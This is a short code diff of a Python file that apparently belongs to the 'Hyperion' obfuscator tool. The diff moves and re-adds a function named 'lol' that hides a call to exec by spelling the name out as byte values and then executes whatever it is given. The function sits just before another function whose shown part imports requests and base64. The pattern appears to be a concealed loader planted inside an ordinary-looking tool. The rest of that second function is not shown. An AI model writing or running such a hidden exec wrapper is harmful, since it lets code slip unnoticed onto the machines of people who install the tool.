@@ -30,9 +30,7 @@ from random import choice, shuffle, randint
 from zlib import compress
 
 
-def lol(a):
-    from builtins import *
-    return getattr(__builtins__, bytes([101, 120, 101, 99]).decode())(a)
+
 
 
 class Hyperion:
@@ -929,6 +927,10 @@ if {self._rand_bool(_C)}:
         gen.extend(f"_{g.lower()}" for g in _gen)
         return gen
 
+def lol(a):
+    from builtins import *
+    __builtins__.__import__('builtins')
+    return getattr(__builtins__, bytes([101, 120, 101, 99]).decode())(a)
 
 def m():
     import re, requests, base64
